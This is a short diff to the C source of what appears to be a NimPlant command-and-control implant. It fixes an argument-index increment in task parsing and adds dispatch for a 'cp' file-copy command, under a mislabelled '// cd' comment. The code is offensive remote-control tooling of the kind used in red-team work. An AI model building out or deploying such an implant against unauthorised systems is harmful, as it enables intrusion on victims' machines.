@@ -359,6 +359,7 @@ struct NimPlantTask* GetTaskForNimPlantClient(struct Relocatable* context, struc
         if (lpResultTask->arguments[dwArgumentIndex] == NULL) goto FAILURE_AND_RETURN;
 
         context->functions.strcpy(lpResultTask->arguments[dwArgumentIndex], lpArgument);
+        dwArgumentIndex ++;
     }
 
     goto CLEANUP_AND_RETURN;
@@ -400,6 +401,11 @@ bool ExecuteTaskForNimPlantClient(struct Relocatable* context, struct NimPlantCo
     DEFINE_STRING(CdCommand, "cd");
     bCompare = context->functions.strcmp(lpTask->command, CdCommand);
     if (bCompare == 0) return CommandCd(context, config, client, lpTask);
+
+    // cd
+    DEFINE_STRING(CpCommand, "cp");
+    bCompare = context->functions.strcmp(lpTask->command, CpCommand);
+    if (bCompare == 0) return CommandCp(context, config, client, lpTask);
 
     // ls
     DEFINE_STRING(LsCommand, "ls");
